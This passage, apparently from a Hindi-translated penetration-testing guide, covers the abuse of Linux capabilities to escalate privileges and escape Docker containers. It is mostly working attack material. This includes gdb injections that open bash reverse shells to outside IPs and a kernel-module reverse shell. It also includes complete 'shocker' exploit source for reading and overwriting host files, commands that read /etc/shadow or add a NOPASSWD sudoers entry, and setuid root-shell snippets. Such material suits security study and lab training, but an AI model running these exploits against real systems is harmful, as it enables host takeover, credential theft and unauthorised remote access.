set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**उदाहरण वातावरण के साथ (Docker ब्रेकआउट) - एक और gdb दुरुपयोग**

यदि **GDB** स्थापित है (या आप इसे `apk add gdb` या `apt install gdb` के साथ स्थापित कर सकते हैं, उदाहरण के लिए) तो आप **होस्ट से एक प्रक्रिया को डिबग** कर सकते हैं और इसे `system` फ़ंक्शन को कॉल करने के लिए बना सकते हैं। (यह तकनीक भी `SYS_ADMIN` क्षमता की आवश्यकता है)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
आप कमांड के निष्पादन का आउटपुट नहीं देख पाएंगे लेकिन यह प्रक्रिया द्वारा निष्पादित किया जाएगा (इसलिए एक रिवर्स शेल प्राप्त करें)।

> [!WARNING]
> यदि आपको "वर्तमान संदर्भ में कोई प्रतीक "system" नहीं है।" त्रुटि मिलती है, तो gdb के माध्यम से एक प्रोग्राम में शेलकोड लोड करने का पिछले उदाहरण जांचें।

**पर्यावरण के साथ उदाहरण (Docker ब्रेकआउट) - शेलकोड इंजेक्शन**

आप docker कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
सूची **प्रक्रियाएँ** जो **होस्ट** में चल रही हैं `ps -eaf`

1. **आर्किटेक्चर** प्राप्त करें `uname -m`
2. आर्किटेक्चर के लिए एक **शेलकोड** खोजें ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. एक **प्रोग्राम** खोजें जो **शेलकोड** को प्रक्रिया की मेमोरी में **इंजेक्ट** करे ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. प्रोग्राम के अंदर **शेलकोड** को **संशोधित** करें और इसे **संकलित** करें `gcc inject.c -o inject`
5. इसे **इंजेक्ट** करें और अपनी **शेल** प्राप्त करें: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** एक प्रक्रिया को **कर्नेल मॉड्यूल लोड और अनलोड करने की अनुमति देता है (`init_module(2)`, `finit_module(2)` और `delete_module(2)` सिस्टम कॉल)**, जो कर्नेल के मुख्य संचालन तक सीधी पहुँच प्रदान करता है। यह क्षमता महत्वपूर्ण सुरक्षा जोखिम प्रस्तुत करती है, क्योंकि यह विशेषाधिकार वृद्धि और कुल प्रणाली के समझौते की अनुमति देती है, जिससे कर्नेल में संशोधन संभव होता है, इस प्रकार सभी Linux सुरक्षा तंत्रों, जिसमें Linux सुरक्षा मॉड्यूल और कंटेनर अलगाव शामिल हैं, को बायपास किया जा सकता है।
**इसका मतलब है कि आप** **होस्ट मशीन के कर्नेल में कर्नेल मॉड्यूल डाल/निकाल सकते हैं।**

**बाइनरी के साथ उदाहरण**

निम्नलिखित उदाहरण में बाइनरी **`python`** के पास यह क्षमता है।
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
डिफ़ॉल्ट रूप से, **`modprobe`** कमांड निर्भरता सूची और फ़ाइलों को **`/lib/modules/$(uname -r)`** निर्देशिका में जांचता है।\
इसका दुरुपयोग करने के लिए, चलिए एक नकली **lib/modules** फ़ोल्डर बनाते हैं:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
फिर **कर्नेल मॉड्यूल को संकलित करें, आप नीचे 2 उदाहरण पा सकते हैं और इसे इस फ़ोल्डर में कॉपी करें:**
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
अंत में, इस कर्नेल मॉड्यूल को लोड करने के लिए आवश्यक पायथन कोड निष्पादित करें:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**उदाहरण 2 बाइनरी के साथ**

निम्नलिखित उदाहरण में बाइनरी **`kmod`** में यह क्षमता है।
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
जिसका मतलब है कि **`insmod`** कमांड का उपयोग करके एक कर्नेल मॉड्यूल डालना संभव है। इस विशेषता का दुरुपयोग करते हुए **reverse shell** प्राप्त करने के लिए नीचे दिए गए उदाहरण का पालन करें।

**पर्यावरण के साथ उदाहरण (Docker ब्रेकआउट)**

आप डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
**SYS_MODULE** क्षमता सक्षम है।

**एक** **कर्नेल मॉड्यूल** बनाएं जो एक रिवर्स शेल को निष्पादित करेगा और **Makefile** को **संकलित** करेगा:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile में प्रत्येक make शब्द से पहले का खाली चर **tab होना चाहिए, स्पेस नहीं**!

इसे संकलित करने के लिए `make` चलाएँ।
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
अंत में, एक शेल के अंदर `nc` शुरू करें और **एक अन्य से मॉड्यूल लोड करें** और आप nc प्रक्रिया में शेल को कैप्चर करेंगे:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**इस तकनीक का कोड "SYS_MODULE क्षमता का दुरुपयोग" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

इस तकनीक का एक और उदाहरण [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) में पाया जा सकता है।

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) एक प्रक्रिया को **फाइलों को पढ़ने और निर्देशिकाओं को पढ़ने और निष्पादित करने के लिए अनुमतियों को बायपास करने** की अनुमति देता है। इसका प्राथमिक उपयोग फाइल खोजने या पढ़ने के उद्देश्यों के लिए है। हालाँकि, यह एक प्रक्रिया को `open_by_handle_at(2)` फ़ंक्शन का उपयोग करने की भी अनुमति देता है, जो किसी भी फ़ाइल तक पहुँच सकता है, जिसमें वे फ़ाइलें भी शामिल हैं जो प्रक्रिया के माउंट नामस्थान के बाहर हैं। `open_by_handle_at(2)` में उपयोग किया जाने वाला हैंडल एक गैर-प्रत्यक्ष पहचानकर्ता होना चाहिए जो `name_to_handle_at(2)` के माध्यम से प्राप्त किया गया हो, लेकिन इसमें संवेदनशील जानकारी जैसे कि इनोड नंबर शामिल हो सकते हैं जो छेड़छाड़ के प्रति संवेदनशील होते हैं। इस क्षमता के शोषण की संभावना, विशेष रूप से डॉकर कंटेनरों के संदर्भ में, सेबास्टियन क्राहमर द्वारा शॉकर एक्सप्लॉइट के साथ प्रदर्शित की गई थी, जैसा कि [यहाँ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) विश्लेषण किया गया है।
**इसका मतलब है कि आप** **फाइल पढ़ने की अनुमति की जांच और निर्देशिका पढ़ने/निष्पादित करने की अनुमति की जांच को बायपास कर सकते हैं।**

**बाइनरी के साथ उदाहरण**

बाइनरी किसी भी फ़ाइल को पढ़ने में सक्षम होगी। इसलिए, यदि किसी फ़ाइल जैसे tar में यह क्षमता है, तो यह शैडो फ़ाइल को पढ़ने में सक्षम होगी:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Example with binary2**

इस मामले में मान लीजिए कि **`python`** बाइनरी में यह क्षमता है। रूट फ़ाइलों की सूची बनाने के लिए आप कर सकते हैं:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
और एक फ़ाइल पढ़ने के लिए आप कर सकते हैं:
```python
print(open("/etc/shadow", "r").read())
```
**उदाहरण वातावरण में (Docker ब्रेकआउट)**

आप docker कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
अगले आउटपुट में आप देख सकते हैं कि **DAC_READ_SEARCH** क्षमता सक्षम है। परिणामस्वरूप, कंटेनर **प्रक्रियाओं को डिबग** कर सकता है।

आप सीख सकते हैं कि निम्नलिखित शोषण कैसे काम करता है [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) लेकिन संक्षेप में **CAP_DAC_READ_SEARCH** न केवल हमें अनुमति जांच के बिना फ़ाइल प्रणाली को पार करने की अनुमति देता है, बल्कि यह _**open_by_handle_at(2)**_ पर किसी भी जांच को स्पष्ट रूप से हटा देता है और **हमारी प्रक्रिया को अन्य प्रक्रियाओं द्वारा खोली गई संवेदनशील फ़ाइलों तक पहुँचने की अनुमति दे सकता है**।

इस अनुमति का दुरुपयोग करने वाला मूल शोषण जो होस्ट से फ़ाइलें पढ़ता है, यहाँ पाया जा सकता है: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), निम्नलिखित एक **संशोधित संस्करण है जो आपको पहले तर्क के रूप में पढ़ने के लिए फ़ाइल निर्दिष्ट करने और इसे एक फ़ाइल में डंप करने की अनुमति देता है।**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> यह एक्सप्लॉइट को होस्ट पर कुछ माउंट किए गए पॉइंटर को खोजने की आवश्यकता है। मूल एक्सप्लॉइट ने फ़ाइल /.dockerinit का उपयोग किया और इस संशोधित संस्करण ने /etc/hostname का उपयोग किया। यदि एक्सप्लॉइट काम नहीं कर रहा है, तो शायद आपको एक अलग फ़ाइल सेट करने की आवश्यकता है। होस्ट में माउंट की गई फ़ाइल खोजने के लिए बस mount कमांड चलाएँ:

![](<../../images/image (407) (1).png>)

**इस तकनीक का कोड "Abusing DAC_READ_SEARCH Capability" के प्रयोगशाला से कॉपी किया गया है** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

## CAP_DAC_OVERRIDE

**इसका मतलब है कि आप किसी भी फ़ाइल पर लिखने की अनुमति की जांच को बायपास कर सकते हैं, इसलिए आप किसी भी फ़ाइल को लिख सकते हैं।**

आपके पास **अधिकार बढ़ाने के लिए कई फ़ाइलें हैं,** [**आप यहाँ से विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**बाइनरी के साथ उदाहरण**

इस उदाहरण में vim के पास यह क्षमता है, इसलिए आप किसी भी फ़ाइल को जैसे _passwd_, _sudoers_ या _shadow_ को संशोधित कर सकते हैं:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Example with binary 2**

In this example **`python`** binary will have this capability. You could use python to override any file:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**उदाहरण वातावरण + CAP_DAC_READ_SEARCH (Docker ब्रेकआउट)**

आप docker कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
सबसे पहले पिछले अनुभाग को पढ़ें जो [**DAC_READ_SEARCH क्षमता का दुरुपयोग करके मनमाने फ़ाइलों को पढ़ता है**](linux-capabilities.md#cap_dac_read_search) होस्ट की और **शोषण को संकलित करें**।\
फिर, **शॉकर शोषण के निम्नलिखित संस्करण को संकलित करें** जो आपको होस्ट के फ़ाइल सिस्टम के अंदर **मनमाने फ़ाइलों को लिखने** की अनुमति देगा:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
डॉकर कंटेनर से बाहर निकलने के लिए आप होस्ट से फ़ाइलें **डाउनलोड** कर सकते हैं `/etc/shadow` और `/etc/passwd`, उन्हें एक **नया उपयोगकर्ता** **जोड़ें**, और उन्हें ओवरराइट करने के लिए **`shocker_write`** का उपयोग करें। फिर, **ssh** के माध्यम से **एक्सेस** करें।

**इस तकनीक का कोड "Abusing DAC_OVERRIDE Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**इसका मतलब है कि किसी भी फ़ाइल के स्वामित्व को बदलना संभव है।**

**बाइनरी के साथ उदाहरण**

मान लीजिए कि **`python`** बाइनरी के पास यह क्षमता है, आप **shadow** फ़ाइल का **स्वामी** **बदल सकते हैं**, **रूट पासवर्ड** **बदल सकते हैं**, और विशेषाधिकार बढ़ा सकते हैं:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
या **`ruby`** बाइनरी के पास यह क्षमता है:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**इसका मतलब है कि किसी भी फ़ाइल की अनुमति बदलना संभव है।**

**बाइनरी के साथ उदाहरण**

यदि पायथन के पास यह क्षमता है, तो आप शैडो फ़ाइल की अनुमतियों को संशोधित कर सकते हैं, **रूट पासवर्ड बदल सकते हैं**, और विशेषाधिकार बढ़ा सकते हैं:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**इसका मतलब है कि बनाए गए प्रक्रिया के प्रभावी उपयोगकर्ता आईडी को सेट करना संभव है।**

**बाइनरी के साथ उदाहरण**

यदि python के पास यह **capability** है, तो आप इसे रूट तक विशेषाधिकार बढ़ाने के लिए बहुत आसानी से दुरुपयोग कर सकते हैं:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**एक और तरीका:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**इसका मतलब है कि बनाए गए प्रक्रिया का प्रभावी समूह आईडी सेट करना संभव है।**

आपके पास **अधिकार बढ़ाने के लिए ओवरराइट करने के लिए बहुत सारे फ़ाइलें हैं,** [**आप यहाँ से विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**बाइनरी के साथ उदाहरण**

इस मामले में, आपको उन दिलचस्प फ़ाइलों की तलाश करनी चाहिए जिन्हें एक समूह पढ़ सकता है क्योंकि आप किसी भी समूह का अनुकरण कर सकते हैं:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
एक बार जब आप एक फ़ाइल ढूंढ लेते हैं जिसे आप (पढ़ने या लिखने के माध्यम से) विशेषाधिकार बढ़ाने के लिए दुरुपयोग कर सकते हैं, तो आप **दिलचस्प समूह का अनुकरण करते हुए एक शेल प्राप्त कर सकते हैं**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
इस मामले में समूह shadow का अनुकरण किया गया था ताकि आप फ़ाइल `/etc/shadow` पढ़ सकें:
```bash
cat /etc/shadow
```
यदि **docker** स्थापित है, तो आप **docker समूह** का **नकली रूप** धारण कर सकते हैं और इसका दुरुपयोग करके [**docker socket** के साथ संवाद करें और विशेषाधिकार बढ़ाएं](#writable-docker-socket)।

## CAP_SETFCAP

**इसका मतलब है कि फ़ाइलों और प्रक्रियाओं पर क्षमताएँ सेट करना संभव है**

**बाइनरी के साथ उदाहरण**

यदि python में यह **क्षमता** है, तो आप इसे रूट तक विशेषाधिकार बढ़ाने के लिए बहुत आसानी से दुरुपयोग कर सकते हैं:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> ध्यान दें कि यदि आप CAP_SETFCAP के साथ बाइनरी को एक नई क्षमता सेट करते हैं, तो आप यह क्षमता खो देंगे।

एक बार जब आपके पास [SETUID capability](linux-capabilities.md#cap_setuid) हो जाती है, तो आप इसके अनुभाग में जा सकते हैं कि कैसे विशेषाधिकार बढ़ाए जाएं।

**पर्यावरण के साथ उदाहरण (Docker ब्रेकआउट)**

डिफ़ॉल्ट रूप से क्षमता **CAP_SETFCAP कंटेनर के अंदर प्रक्रिया को Docker में दी जाती है**। आप यह कुछ इस तरह करके जांच सकते हैं:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
यह क्षमता **बाइनरीज़ को किसी अन्य क्षमता देने** की अनुमति देती है, इसलिए हम इस पृष्ठ पर उल्लेखित **अन्य क्षमता ब्रेकआउट्स** का **दुरुपयोग** करके कंटेनर से **भागने** के बारे में सोच सकते हैं।\
हालांकि, यदि आप उदाहरण के लिए gdb बाइनरी को CAP_SYS_ADMIN और CAP_SYS_PTRACE क्षमताएँ देने की कोशिश करते हैं, तो आप पाएंगे कि आप उन्हें दे सकते हैं, लेकिन **बाइनरी इसके बाद निष्पादित नहीं हो सकेगी**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
